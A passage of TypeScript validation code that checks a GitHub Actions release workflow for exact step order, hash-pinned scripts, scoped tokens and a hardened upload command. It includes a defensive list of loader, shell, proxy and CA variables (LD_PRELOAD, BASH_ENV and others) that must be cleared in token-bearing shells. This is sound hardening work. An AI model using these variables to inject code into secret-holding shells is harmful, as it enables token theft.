    (workflow.match(/--paginate --slurp/g) ?? []).length !== 19 ||
    workflow.includes("add // []") ||
    workflow.includes("[.[].workflow_runs[]]") ||
    workflow.includes("[.[].jobs[]]") ||
    workflow.includes("[.[].artifacts[]]")
  ) {
    return ["every paginated release read must use one strict collection decoder"];
  }
  const preflight = runBody(namedStep(steps, "Preflight existing GitHub release and every Basic asset before npm"));
  const initIndex = preflight.indexOf("RELEASE_ABSENCE_OBSERVATIONS=0");
  const loopIndex = preflight.indexOf("release_preflight_attempt<=12", initIndex);
  const refreshIndex = preflight.indexOf("if ! RELEASE_PAGES=$(gh_read api --paginate --slurp", loopIndex);
  const refreshEndpointIndex = preflight.indexOf(
    `"repos/\${{ github.repository }}/releases?per_page=100"); then`,
    refreshIndex
  );
  const failureIndex = preflight.indexOf("GitHub release preflight read failed", refreshEndpointIndex);
  const failureContinueIndex = preflight.indexOf("continue", failureIndex);
  const parseBindingIndex = preflight.indexOf("RELEASES=$(printf '%s' \"$RELEASE_PAGES\"", failureContinueIndex);
  const parseIndex = preflight.indexOf("flatten-pages release", parseBindingIndex);
  const countIndex = preflight.indexOf("RELEASE_COUNT=$(printf '%s' \"$RELEASES\"", parseIndex);
  const tagFilter = "'[.[] | select(.tag_name == $tag)] | length')";
  const tagFilterIndex = preflight.indexOf(tagFilter, countIndex);
  const duplicateGuardIndex = preflight.indexOf('if [ "$RELEASE_COUNT" -gt 1 ]; then', tagFilterIndex);
  const duplicateErrorIndex = preflight.indexOf(
    "GitHub returned duplicate draft/published releases for $TAG",
    duplicateGuardIndex
  );
  const visibleBreakIndex = preflight.indexOf('[ "$RELEASE_COUNT" -eq 1 ]; then break; fi', duplicateErrorIndex);
  const incrementIndex = preflight.indexOf(
    "RELEASE_ABSENCE_OBSERVATIONS=$((RELEASE_ABSENCE_OBSERVATIONS + 1))",
    countIndex
  );
  const readyIndex = preflight.indexOf('[ "$RELEASE_ABSENCE_OBSERVATIONS" -eq 6 ]', incrementIndex);
  const guardIndex = preflight.indexOf('[ "$RELEASE_ABSENCE_OBSERVATIONS" -ne 6 ]', readyIndex);
  const absentStateIndex = preflight.indexOf('{"release":null,"assets":[]}', guardIndex);
  if (
    mutationMatchCount(preflight, "RELEASE_ABSENCE_OBSERVATIONS=0") !== 1 ||
    mutationMatchCount(preflight, "RELEASE_ABSENCE_OBSERVATIONS=$((RELEASE_ABSENCE_OBSERVATIONS + 1))") !== 1 ||
    mutationMatchCount(preflight, "if ! RELEASE_PAGES=$(gh_read api --paginate --slurp") !== 1 ||
    !preflight.includes("sleep 5") ||
    initIndex < 0 ||
    loopIndex <= initIndex ||
    refreshIndex <= loopIndex ||
    refreshEndpointIndex <= refreshIndex ||
    failureIndex <= refreshEndpointIndex ||
    failureContinueIndex <= failureIndex ||
    parseBindingIndex <= failureContinueIndex ||
    parseIndex <= parseBindingIndex ||
    countIndex <= parseIndex ||
    tagFilterIndex <= countIndex ||
    duplicateGuardIndex <= tagFilterIndex ||
    preflight.slice(tagFilterIndex + tagFilter.length, duplicateGuardIndex).trim().length !== 0 ||
    duplicateErrorIndex <= duplicateGuardIndex ||
    visibleBreakIndex <= duplicateErrorIndex ||
    preflight.slice(tagFilterIndex + tagFilter.length, visibleBreakIndex).includes("RELEASE_COUNT=") ||
    incrementIndex <= visibleBreakIndex ||
    readyIndex <= incrementIndex ||
    guardIndex <= readyIndex ||
    absentStateIndex <= guardIndex
  ) {
    return ["release absence must require six successful strict zero observations before npm"];
  }
  return [];
}

function githubReleaseTransactionProblems(workflow: string): string[] {
  let steps: YamlRecord[];
  let releaseTransaction: string;
  try {
    const document = yamlRecord(load(workflow));
    const publish = yamlRecord(yamlRecord(document?.jobs)?.publish);
    steps = yamlSteps(publish ?? {});
    releaseTransaction = releaseTransactionFixtureBody(document);
  } catch {
    return ["GitHub Release transaction workflow must parse"];
  }
  const preflight = runBody(namedStep(steps, "Preflight existing GitHub release and every Basic asset before npm"));
  const prepare = runBody(namedStep(steps, "Prepare draft GitHub Release"));
  const uploadStep = namedStep(steps, "Upload Basic MCPB asset, checksum, and provenance");
  const uploadWrapper = runBody(uploadStep);
  const upload = releaseTransaction;
  if (preflight.length === 0 || prepare.length === 0 || upload.length === 0) {
    return ["GitHub Release transaction steps must exist"];
  }

  const problems: string[] = [];
  const assignmentLineCount = (body: string, name: string) => {
    if (!/^[A-Z][A-Z0-9_]*$/u.test(name)) return 0;
    const modifierAssignment = new RegExp(
      `^(?:export|readonly|declare|typeset|local)(?:\\s+-[A-Za-z]+)*\\s+${name}=`,
      "u"
    );
    const printfAssignment = new RegExp(
      `^(?:(?:builtin|command)\\s+)?printf\\s+-v\\s+(?:["']?)${name}(?:["']?)(?:\\s|$)`,
      "u"
    );
    return body
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line.startsWith(`${name}=`) || modifierAssignment.test(line) || printfAssignment.test(line))
      .length;
  };
  const boundedBlock = (body: string, startNeedle: string, endNeedle: string) => {
    const start = body.indexOf(startNeedle);
    const end = start < 0 ? -1 : body.indexOf(endNeedle, start + startNeedle.length);
    return start >= 0 && end > start ? body.slice(start, end) : "";
  };
  const normalizedIndentedBlock = (body: string, startNeedle: string, endNeedle: string) => {
    if (mutationMatchCount(body, startNeedle) !== 1 || mutationMatchCount(body, endNeedle) !== 1) return "";
    const start = body.indexOf(startNeedle);
    const end = start < 0 ? -1 : body.indexOf(endNeedle, start + startNeedle.length);
    if (start < 0 || end <= start) return "";
    const startLine = body.lastIndexOf("\n", start) + 1;
    const endLine = body.lastIndexOf("\n", end) + 1;
    const endLineBreak = body.indexOf("\n", end);
    const endLineEnd = endLineBreak < 0 ? body.length : endLineBreak;
    const indent = body.slice(startLine, start);
    const endIndent = body.slice(endLine, end);
    const endSuffix = body.slice(end + endNeedle.length, endLineEnd);
    if (
      endLine <= startLine ||
      !/^[ \t]*$/u.test(indent) ||
      !/^[ \t]*$/u.test(endIndent) ||
      !endIndent.startsWith(indent) ||
      endSuffix.length !== 0
    ) {
      return "";
    }
    const rawBlock = body.slice(startLine, endLine);
    const lines = (rawBlock.endsWith("\n") ? rawBlock.slice(0, -1) : rawBlock).split("\n");
    if (lines.some((line) => line.length > 0 && !line.startsWith(indent))) return "";
    return lines.map((line) => (line.length > 0 ? line.slice(indent.length) : line)).join("\n");
  };
  const sha256 = (body: string) => createHash("sha256").update(body, "utf8").digest("hex");
  const clearedSecretEnv = [
    "BASH_ENV",
    "ENV",
    "SHELLOPTS",
    "PS4",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "LD_DEBUG_OUTPUT",
    "LD_PROFILE",
    "GLIBC_TUNABLES",
    "TAR_OPTIONS",
    "OPENSSL_CONF",
    "NODE_DEBUG",
    "GODEBUG",
    "HTTPS_PROXY",
    "HTTP_PROXY",
    "ALL_PROXY",
    "CURL_CA_BUNDLE",
    "SSL_CERT_FILE",
    "SSL_CERT_DIR",
    "NODE_EXTRA_CA_CERTS",
    "NODE_OPTIONS"
  ];
  const githubSecretSteps = [
    "Assert tag is on main and required CI checks passed",
    "Download exact CI-gated Basic MCPB release asset",
    "Preflight existing GitHub release and every Basic asset before npm",
    "Publish with provenance or verify an exact prior publication",
    "Prepare draft GitHub Release",
    "Upload Basic MCPB asset, checksum, and provenance",
    MCP_REGISTRY_STEP_NAME
  ];
  const clearedGithubEnv = [...clearedSecretEnv, "GH_HTTP_UNIX_SOCKET"];
  const otherSecretSteps: string[] = [];
  const checkoutSteps = steps.filter(
    (step) => typeof step.uses === "string" && step.uses.startsWith("actions/checkout@")
  );
  const checkout = checkoutSteps[0];
  const githubTokenSteps = new Set(["Assert tag is on main and required CI checks passed"]);
  const freshGithubConfig =
    'GH_CONFIG_DIR=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-gh-config.XXXXXX")\nexport GH_CONFIG_DIR';
  const protectedShell = "/bin/bash --noprofile --norc -p -e -o pipefail {0}";
  const hasInjectedSecret = (step: YamlRecord) => {
    const env = yamlRecord(step.env);
    return (
      env !== null &&
      (("GH_TOKEN" in env && env.GH_TOKEN !== "") || ("NODE_AUTH_TOKEN" in env && env.NODE_AUTH_TOKEN !== ""))
    );
  };
  const secretStepEnvIsSealed =
    [...githubSecretSteps, ...otherSecretSteps].every(
      (name) => steps.filter((step) => step.name === name).length === 1
    ) &&
    steps
      .filter(hasInjectedSecret)
      .every((step) => typeof step.name === "string" && githubSecretSteps.includes(step.name)) &&
    steps.filter(hasInjectedSecret).length === githubSecretSteps.length &&
    mutationMatchCount(workflow, `\${{ github.token }}`) === 1 &&
    mutationMatchCount(workflow, `\${{ secrets.GITHUB_TOKEN }}`) === RELEASE_SECRET_GITHUB_TOKEN_COUNT &&
    mutationMatchCount(workflow, `\${{ secrets.NPM_TOKEN }}`) === 1 &&
    checkoutSteps.length === 1 &&
    yamlRecord(checkout?.with)?.ref === `\${{ github.event.inputs.tag || github.ref }}` &&
    yamlRecord(checkout?.with)?.["fetch-depth"] === 0 &&
    yamlRecord(checkout?.with)?.["persist-credentials"] === false &&
    githubSecretSteps.every((name) => {
      const env = yamlRecord(namedStep(steps, name)?.env);
      const stepBody =
        name === "Upload Basic MCPB asset, checksum, and provenance" ? upload : runBody(namedStep(steps, name));
      const isRegistryStep = name === MCP_REGISTRY_STEP_NAME;
      const expectedPrefix =
        name === "Publish with provenance or verify an exact prior publication"
          ? `set -euo pipefail\n${LOWERCASE_PROXY_UNSET}\n${NPM_LOWERCASE_PIN_BLOCK}\n${freshGithubConfig}`
          : isRegistryStep
            ? `set -euo pipefail\n${LOWERCASE_PROXY_UNSET}\nbuiltin umask 077`
            : `set -euo pipefail\n${LOWERCASE_PROXY_UNSET}\n${freshGithubConfig}`;
      const githubConfigIsFresh = isRegistryStep
        ? mutationMatchCount(stepBody, 'GH_CONFIG_DIR="$WORK_ROOT/gh-config"') === 1 &&
          stepBody.includes('/bin/mkdir -m 0700 "$MCP_REGISTRY_HOME" "$PUBLISHER_ROOT" "$GH_CONFIG_DIR"') &&
          mutationMatchCount(stepBody, "export GH_CONFIG_DIR") === 1
        : mutationMatchCount(stepBody, freshGithubConfig) === 1;
      return (
        env?.GH_HOST === "github.com" &&
        namedStep(steps, name)?.shell === protectedShell &&
        env?.NODE_TLS_REJECT_UNAUTHORIZED === "1" &&
        env?.GH_TOKEN === (githubTokenSteps.has(name) ? `\${{ github.token }}` : `\${{ secrets.GITHUB_TOKEN }}`) &&
        clearedGithubEnv.every((key) => env?.[key] === "") &&
        githubConfigIsFresh &&
        stepBody.startsWith(expectedPrefix)
      );
    }) &&
    otherSecretSteps.every((name) => {
      const step = namedStep(steps, name);
      const env = yamlRecord(step?.env);
      return (
        step?.shell === protectedShell &&
        env?.NODE_TLS_REJECT_UNAUTHORIZED === "1" &&
        clearedSecretEnv.every((key) => env?.[key] === "")
      );
    });
  if (!secretStepEnvIsSealed) {
    problems.push(
      "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
    );
  }
  const expectedUploadHash = createHash("sha256")
    .update(releaseTransactionRuntimeSnapshot(upload), "utf8")
    .digest("hex");
  if (
    uploadWrapper !== releaseTransactionWrapper(expectedUploadHash) ||
    yamlRecord(uploadStep?.env)?.MCPB_RELEASE_WORKFLOW_SHA !== `\${{ github.workflow_sha }}`
  ) {
    problems.push("GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot");
  }
  const releaseTestStep = namedStep(steps, "Test exact source without npm or contents-write tokens");
  const releaseTestEnv = yamlRecord(releaseTestStep?.env);
  if (
    steps.filter((step) => step.name === "Test exact source without npm or contents-write tokens").length !== 1 ||
    runBody(releaseTestStep) !== "npm test" ||
    releaseTestEnv !== null
  ) {
    problems.push("release-time tests must run without npm or contents-write tokens");
  }
  // These hashes deliberately freeze the complete status-envelope parser and
  // both write-authorizing call sites. Substring inventories cannot detect an
  // additive `|| true`, a forced return code, or a second fail-open branch.
  const preflightLatestHelper = boundedBlock(preflight, "github_latest_read() {", "\nVERSION=");
  const uploadLatestHelper = boundedBlock(upload, "github_latest_read() {", "\nVERSION=");
  const preflightLatestCaller = boundedBlock(preflight, "assert_stable_github_advance() {", "\nfor LOCAL_ASSET");
  const uploadLatestCaller = boundedBlock(
    upload,
    "# The stable-channel guard is deliberately after reserve",
    "\n    PATCH_EXIT=0"
  );
  if (
    mutationMatchCount(workflow, "github_latest_read() {") !== 2 ||
    mutationMatchCount(workflow, "GITHUB_LATEST_EXIT=$?") !== 2 ||
    mutationMatchCount(workflow, "GITHUB_LATEST_SNAPSHOT") !== 6 ||
    mutationMatchCount(
      workflow,
      '.documentation_url == "https://docs.github.com/rest/releases/releases#get-the-latest-release"'
    ) !== 2 ||
    preflightLatestHelper !== uploadLatestHelper ||
    sha256(preflightLatestHelper) !== "46b6a5d80735d489f616088c0bfb839adb89332e86a3edc23df20aa3dbbab817" ||
    sha256(preflightLatestCaller) !== "454974092ffab8215eadcf379d249cf79f7f6f70e0de22590c2f325e397a61e8" ||
    sha256(uploadLatestCaller) !== "55946514a824216a1c78ded2dba1e48ec8fcbb675da99d6243c911fd5f531ef2"
  ) {
    problems.push("GitHub latest-release absence must be one strict HTTP identity, never stderr text");
  }
  if (
    mutationMatchCount(workflow, 'NOTES=$(awk -v heading="## [$VERSION] — "') !== 3 ||
    mutationMatchCount(workflow, 'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$NOTES"') !== 3
  ) {
    problems.push("every release snapshot must bind the exact canonical title and CHANGELOG body");
  }
  const createReserve = 'require_job_reserve 3600 "GitHub draft creation"';
  const createArgs = `CREATE_ARGS=(release create "$TAG" --repo "\${{ github.repository }}" \\\n  --title "$TAG" --notes "$NOTES" --draft --verify-tag)`;
  const createChannelBlock =
    `if [ "\${{ steps.dist_tag.outputs.tag }}" != "latest" ]; then\n` + "  CREATE_ARGS+=(--prerelease)\n" + "fi";
  const createCommand = `"$TIMEOUT_BIN" --kill-after=10s 300s "$GH_BIN" "\${CREATE_ARGS[@]}"`;
  const createRecovery = "for (( create_recovery_attempt=1; create_recovery_attempt<=12;";
  const createReserveIndex = prepare.indexOf(createReserve);
  const createTagIndex = prepare.indexOf("assert_remote_tag_identity", createReserveIndex);
  const createCommandIndex = prepare.indexOf(createCommand, createTagIndex);
  const createRecoveryIndex = prepare.indexOf(createRecovery, createCommandIndex);
  const createActionIndex = prepare.indexOf('RECOVERY_ACTION" != "reuse_published"', createRecoveryIndex);
  const createActionErrorIndex = prepare.indexOf(
    "Draft create readback produced unsafe release action",
    createActionIndex
  );
  const createPostTagIndex = prepare.indexOf("assert_remote_tag_identity", createActionErrorIndex);
  const createConfirmationIndex = prepare.indexOf("Confirmed exact release $TAG", createPostTagIndex);
  if (
    mutationMatchCount(prepare, createArgs) !== 1 ||
    assignmentLineCount(prepare, "TAG") !== 1 ||
    mutationMatchCount(prepare, "CREATE_ARGS=(") !== 1 ||
    mutationMatchCount(prepare, createChannelBlock) !== 1 ||
    mutationMatchCount(prepare, "CREATE_ARGS+=(") !== 1 ||
    mutationMatchCount(prepare, createCommand) !== 1 ||
    mutationMatchCount(prepare, 'release create "$TAG"') !== 1 ||
    !prepare.includes('awk -v heading="## [$VERSION] — "') ||
    !prepare.includes("index($0, heading) == 1") ||
    prepare.includes('$0 ~ "^## \\[" ver') ||
    !prepare.includes("/blob/main/CHANGELOG.md) for full release notes") ||
    prepare.includes(`CHANGELOG.md#\${VERSION//./}`) ||
    !prepare.includes(NPM_RESERVE_DEADLINE_GUARD) ||
    !prepare.includes("CREATE_EXIT=$?") ||
    !prepare.includes("authoritative reads must prove one exact safe release state") ||
    !prepare.includes("flatten-pages release") ||
    !prepare.includes("flatten-pages asset") ||
    !prepare.includes('RECOVERY_ACTION" != "resume_draft"') ||
    !prepare.includes('RECOVERY_ACTION" != "publish_draft"') ||
    !prepare.includes('RECOVERY_ACTION" != "reuse_published"') ||
    createReserveIndex < 0 ||
    createTagIndex <= createReserveIndex ||
    createCommandIndex <= createTagIndex ||
    createRecoveryIndex <= createCommandIndex ||
    createActionIndex <= createRecoveryIndex ||
    createActionErrorIndex <= createActionIndex ||
    createPostTagIndex <= createActionErrorIndex ||
    createConfirmationIndex <= createPostTagIndex
  ) {
    problems.push("draft creation must be one bounded write followed by exact readback without replay");
  }

  const uploadPost = "--fail-with-body --silent --show-error --request POST --retry 0";
  const uploadTarget = '"$UPLOAD_BASE?name=$ENCODED_NAME")';
  const releaseStatePayload = "'{release: $release, assets: $assets}')";
  const metadataProjection = "[.[] | {name, content_type, size, digest}] | sort_by(.name)";
  const exactUploadCurl =
    'UPLOAD_STATUS=$("$TIMEOUT_BIN" --kill-after=10s 310s "$CURL_BIN" --disable \\\n' +
    "  --fail-with-body --silent --show-error --request POST --retry 0 \\\n" +
    "  --proxy '' --proto '=https' --tlsv1.2 --max-redirs 0 \\\n" +
    "  --connect-timeout 10 --max-time 300 --max-filesize 1048576 \\\n" +
    '  -H "Authorization: Bearer $GH_TOKEN" \\\n' +
    '  -H "Accept: application/vnd.github+json" \\\n' +
    '  -H "X-GitHub-Api-Version: 2022-11-28" \\\n' +
    '  -H "Content-Type: application/octet-stream" \\\n' +
    '  --data-binary "@$LOCAL_ASSET" --output "$UPLOAD_RESPONSE" --write-out \'%{http_code}\' \\\n' +
    '  "$UPLOAD_BASE?name=$ENCODED_NAME")';
  const uploadCurlBody = normalizedIndentedBlock(upload, 'UPLOAD_STATUS=$("$TIMEOUT_BIN"', "UPLOAD_EXIT=$?");
  const uploadDraftGuard = 'if [ "$PREWRITE_ACTION" != "resume_draft" ] || [ "$PREWRITE_NAME_COUNT" -ne 0 ]; then';
  const uploadConfirmGuard = 'if [ "$CONFIRM_ACTION" != "resume_draft" ] || [ "$CONFIRM_NAME_COUNT" -ne 0 ] ||';
  const uploadConfirmProjectionGuard = '[ "$CONFIRM_ASSET_PROJECTION" != "$CONFIRM_LOCAL_SUBSET" ]; then';
  const prewriteStateSource = `PREWRITE_STATE=$(jq -n --argjson release "$CURRENT_RELEASE" --argjson assets "$CURRENT_ASSETS"`;
  const prewriteActionSource = `PREWRITE_ACTION=$(printf '%s' "$PREWRITE_STATE" | release_state | jq -r '.action')`;
  const prewriteNameCountSource = `PREWRITE_NAME_COUNT=$(printf '%s' "$CURRENT_ASSETS" | jq --arg name "$NAME"`;
  const prewriteProjectionSource = `PREWRITE_ASSET_PROJECTION=$(printf '%s' "$CURRENT_ASSETS" | jq -cS`;
  const prewriteLocalSubsetSource = `PREWRITE_LOCAL_SUBSET=$(jq -cn --argjson local "$LOCAL_ASSET_PROJECTION"`;
  const prewriteLocalSubsetRemoteSource = '--argjson remote "$CURRENT_ASSETS"';
  const prewriteProjectionGuard = '[ "$PREWRITE_ASSET_PROJECTION" != "$PREWRITE_LOCAL_SUBSET" ]; then';
  const confirmStateSource = `CONFIRM_STATE=$(jq -n --argjson release "$CONFIRM_RELEASE" --argjson assets "$CONFIRM_ASSETS"`;
  const confirmActionSource = `CONFIRM_ACTION=$(printf '%s' "$CONFIRM_STATE" | release_state | jq -r '.action')`;
  const confirmNameCountSource = `CONFIRM_NAME_COUNT=$(printf '%s' "$CONFIRM_ASSETS" | jq --arg name "$NAME"`;
  const confirmProjectionSource = `CONFIRM_ASSET_PROJECTION=$(printf '%s' "$CONFIRM_ASSETS" | jq -cS`;
  const confirmLocalSubsetSource = `CONFIRM_LOCAL_SUBSET=$(jq -cn --argjson local "$LOCAL_ASSET_PROJECTION"`;
  const confirmLocalSubsetRemoteSource = '--argjson remote "$CONFIRM_ASSETS"';
  const localSubsetProjection =
    "[$local[] | . as $candidate | select(any($remote[]; .name == $candidate.name))] | sort_by(.name)";
  const uploadConfirmCall = 'if ! confirm_exact_draft_identity "Immediate pre-upload confirmation for $NAME"; then';
  const uploadBaseSource = `UPLOAD_BASE=\${CONFIRM_UPLOAD_URL%%\\{*}`;
  const prewriteAuthorizationBlock = normalizedIndentedBlock(upload, prewriteStateSource, uploadConfirmCall);
  const confirmAuthorizationBlock = normalizedIndentedBlock(upload, uploadConfirmCall, uploadBaseSource);
  const hasExactPrewriteAuthorizationBlock =
    sha256(prewriteAuthorizationBlock) === "1c6761bb54fe84f3adb666b82c80b39261bc023b92dde7c6d1cde631a649d852";
  const hasExactConfirmAuthorizationBlock =
    sha256(confirmAuthorizationBlock) === "fa471513b99a728dea4dfdfa7354a7c9a26d71808e417c68c4de455f567f105b";
  const absenceLoop = "for (( absence_attempt=1; absence_attempt<=12;";
  const uploadReserve = 'require_job_reserve 1500 "release asset upload for $NAME"';
  const uploadRecovery = "for (( upload_recovery_attempt=1; upload_recovery_attempt<=12;";
  const absenceIndex = upload.indexOf(absenceLoop);
  const uploadReserveIndex = upload.indexOf(uploadReserve, absenceIndex);
  const uploadTagIndex = upload.indexOf("assert_remote_tag_identity", uploadReserveIndex);
  const uploadRefreshIndex = upload.indexOf("Immediate pre-upload reconciliation for $NAME", uploadTagIndex);
  const prewriteStateSourceIndex = upload.indexOf(prewriteStateSource, uploadRefreshIndex);
  const prewriteActionSourceIndex = upload.indexOf(prewriteActionSource, prewriteStateSourceIndex);
  const prewriteNameCountSourceIndex = upload.indexOf(prewriteNameCountSource, prewriteActionSourceIndex);
  const uploadDraftGuardIndex = upload.indexOf(uploadDraftGuard, prewriteNameCountSourceIndex);
  const prewriteProjectionSourceIndex = upload.indexOf(prewriteProjectionSource, uploadDraftGuardIndex);
  const prewriteLocalSubsetSourceIndex = upload.indexOf(prewriteLocalSubsetSource, prewriteProjectionSourceIndex);
  const prewriteLocalSubsetRemoteSourceIndex = upload.indexOf(
    prewriteLocalSubsetRemoteSource,
    prewriteLocalSubsetSourceIndex
  );
  const prewriteProjectionGuardIndex = upload.indexOf(prewriteProjectionGuard, prewriteLocalSubsetRemoteSourceIndex);
  const uploadConfirmIndex = upload.indexOf(
    "Immediate pre-upload confirmation for $NAME",
    prewriteProjectionGuardIndex
  );
  const uploadConfirmStateIndex = upload.indexOf(confirmStateSource, uploadConfirmIndex);
  const uploadConfirmActionSourceIndex = upload.indexOf(confirmActionSource, uploadConfirmStateIndex);
  const uploadConfirmNameCountSourceIndex = upload.indexOf(confirmNameCountSource, uploadConfirmActionSourceIndex);
  const uploadConfirmProjectionSourceIndex = upload.indexOf(confirmProjectionSource, uploadConfirmNameCountSourceIndex);
  const uploadConfirmLocalSubsetSourceIndex = upload.indexOf(
    confirmLocalSubsetSource,
    uploadConfirmProjectionSourceIndex
  );
  const uploadConfirmLocalSubsetRemoteSourceIndex = upload.indexOf(
    confirmLocalSubsetRemoteSource,
    uploadConfirmLocalSubsetSourceIndex
  );
  const uploadConfirmGuardIndex = upload.indexOf(uploadConfirmGuard, uploadConfirmLocalSubsetRemoteSourceIndex);
  const uploadConfirmProjectionGuardIndex = upload.indexOf(uploadConfirmProjectionGuard, uploadConfirmGuardIndex);
  const uploadConfirmErrorIndex = upload.indexOf("Final pre-upload snapshot is not", uploadConfirmProjectionGuardIndex);
  const uploadUrlGuardIndex = upload.indexOf(
    "GitHub release upload URL is not bound to the exact repository and release ID",
    uploadConfirmErrorIndex
  );
  const uploadRehashIndex = upload.indexOf("Canonical local release asset changed before upload", uploadUrlGuardIndex);
  const uploadBaseIndex = upload.indexOf(uploadBaseSource, uploadRehashIndex);
  const uploadPostIndex = upload.indexOf(uploadPost, uploadBaseIndex);
  const uploadTargetIndex = upload.indexOf(uploadTarget, uploadPostIndex);
  const uploadRecoveryIndex = upload.indexOf(uploadRecovery, uploadPostIndex);
  const uploadRecoveryEndIndex = upload.indexOf(
    "Ambiguous upload never exposed exact asset $NAME",
    uploadRecoveryIndex
  );
  const uploadPostTagIndex = upload.indexOf("assert_remote_tag_identity", uploadRecoveryEndIndex);
  const uploadIdentityIndex = upload.indexOf('if [ "$MATCH_COUNT" -ne 1 ]; then', uploadPostTagIndex);
  if (
    mutationMatchCount(upload, "--request POST") !== 1 ||
    mutationMatchCount(upload, uploadPost) !== 1 ||
    mutationMatchCount(upload, uploadTarget) !== 1 ||
    uploadCurlBody !== exactUploadCurl ||
    mutationMatchCount(upload, uploadDraftGuard) !== 1 ||
    mutationMatchCount(upload, uploadConfirmGuard) !== 1 ||
    mutationMatchCount(upload, uploadConfirmProjectionGuard) !== 1 ||
    mutationMatchCount(upload, prewriteStateSource) !== 1 ||
    mutationMatchCount(upload, prewriteActionSource) !== 1 ||
    mutationMatchCount(upload, prewriteNameCountSource) !== 1 ||
    mutationMatchCount(upload, prewriteProjectionSource) !== 1 ||
    mutationMatchCount(upload, prewriteLocalSubsetSource) !== 1 ||
    mutationMatchCount(upload, prewriteLocalSubsetRemoteSource) !== 1 ||
    mutationMatchCount(upload, prewriteProjectionGuard) !== 1 ||
    mutationMatchCount(upload, confirmStateSource) !== 1 ||
    mutationMatchCount(upload, confirmActionSource) !== 1 ||
    mutationMatchCount(upload, confirmNameCountSource) !== 1 ||
    mutationMatchCount(upload, confirmProjectionSource) !== 1 ||
    mutationMatchCount(upload, confirmLocalSubsetSource) !== 1 ||
    mutationMatchCount(upload, confirmLocalSubsetRemoteSource) !== 1 ||
    mutationMatchCount(upload, localSubsetProjection) !== 2 ||
    !hasExactPrewriteAuthorizationBlock ||
    !hasExactConfirmAuthorizationBlock ||
    mutationMatchCount(upload, '"$CURL_BIN"') !== 1 ||
    assignmentLineCount(upload, "TAG") !== 1 ||
    assignmentLineCount(upload, "RELEASE_ID") !== 1 ||
    assignmentLineCount(upload, "ENCODED_NAME") !== 1 ||
    assignmentLineCount(upload, "LOCAL_ASSET") !== 0 ||
    assignmentLineCount(upload, "LOCAL_SIZE") !== 2 ||
    assignmentLineCount(upload, "LOCAL_DIGEST") !== 2 ||
    assignmentLineCount(upload, "UPLOAD_EXIT") !== 2 ||
    assignmentLineCount(upload, "UPLOAD_STATUS") !== 1 ||
    assignmentLineCount(upload, "PREWRITE_STATE") !== 1 ||
    assignmentLineCount(upload, "PREWRITE_ACTION") !== 1 ||
    assignmentLineCount(upload, "PREWRITE_NAME_COUNT") !== 1 ||
    assignmentLineCount(upload, "PREWRITE_ASSET_PROJECTION") !== 1 ||
    assignmentLineCount(upload, "PREWRITE_LOCAL_SUBSET") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_STATE") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_ACTION") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_NAME_COUNT") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_ASSET_PROJECTION") !== 1 ||
    assignmentLineCount(upload, "CONFIRM_LOCAL_SUBSET") !== 1 ||
    mutationMatchCount(upload, "CONFIRM_UPLOAD_URL=") !== 1 ||
    mutationMatchCount(upload, "UPLOAD_BASE=") !== 1 ||
    !upload.includes(NPM_RESERVE_DEADLINE_GUARD) ||
    !upload.includes('"$CURL_BIN" --disable') ||
    !upload.includes("--proxy ''") ||
    !upload.includes("--proto '=https' --tlsv1.2 --max-redirs 0") ||
    !upload.includes("--connect-timeout 10 --max-time 300 --max-filesize 1048576") ||
    !upload.includes("ASSET_ABSENCE_OBSERVATIONS=$((ASSET_ABSENCE_OBSERVATIONS + 1))") ||
    !upload.includes('[ "$ASSET_ABSENCE_OBSERVATIONS" -ne 6 ]') ||
    !upload.includes("Canonical local release asset changed before upload") ||
    !upload.includes('CONFIRM_DRAFT" != "true"') ||
    mutationMatchCount(upload, "confirm_exact_draft_identity()") !== 1 ||
    mutationMatchCount(upload, "confirm_exact_draft_identity ") !== 2 ||
    mutationMatchCount(upload, "UPLOAD_EXIT=$?") !== 1 ||
    !upload.includes('UPLOAD_STATUS" = "201"') ||
    !upload.includes("Upload response was malformed") ||
    !upload.includes("without repeating POST") ||
    !upload.includes("Ambiguous upload never exposed exact asset") ||
    !upload.includes("manual recovery required") ||
    absenceIndex < 0 ||
    uploadReserveIndex <= absenceIndex ||
    uploadTagIndex <= uploadReserveIndex ||
    uploadRefreshIndex <= uploadTagIndex ||
    prewriteStateSourceIndex <= uploadRefreshIndex ||
    prewriteActionSourceIndex <= prewriteStateSourceIndex ||
    prewriteNameCountSourceIndex <= prewriteActionSourceIndex ||
    uploadDraftGuardIndex <= prewriteNameCountSourceIndex ||
    prewriteProjectionSourceIndex <= uploadDraftGuardIndex ||
    prewriteLocalSubsetSourceIndex <= prewriteProjectionSourceIndex ||
    prewriteLocalSubsetRemoteSourceIndex <= prewriteLocalSubsetSourceIndex ||
    prewriteProjectionGuardIndex <= prewriteLocalSubsetRemoteSourceIndex ||
    uploadConfirmIndex <= prewriteProjectionGuardIndex ||
    uploadConfirmStateIndex <= uploadConfirmIndex ||
    uploadConfirmActionSourceIndex <= uploadConfirmStateIndex ||
    uploadConfirmNameCountSourceIndex <= uploadConfirmActionSourceIndex ||
    uploadConfirmProjectionSourceIndex <= uploadConfirmNameCountSourceIndex ||
    uploadConfirmLocalSubsetSourceIndex <= uploadConfirmProjectionSourceIndex ||
    uploadConfirmLocalSubsetRemoteSourceIndex <= uploadConfirmLocalSubsetSourceIndex ||
    uploadConfirmGuardIndex <= uploadConfirmLocalSubsetRemoteSourceIndex ||
    uploadConfirmProjectionGuardIndex <= uploadConfirmGuardIndex ||
    upload.slice(uploadConfirmGuardIndex + uploadConfirmGuard.length, uploadConfirmProjectionGuardIndex).trim() !==
      "\\" ||
    uploadConfirmErrorIndex <= uploadConfirmProjectionGuardIndex ||
    uploadUrlGuardIndex <= uploadConfirmErrorIndex ||
    uploadRehashIndex <= uploadUrlGuardIndex ||
    uploadBaseIndex <= uploadRehashIndex ||
    uploadPostIndex <= uploadBaseIndex ||
    uploadTargetIndex <= uploadPostIndex ||
    uploadRecoveryIndex <= uploadPostIndex ||
    uploadRecoveryEndIndex <= uploadRecoveryIndex ||
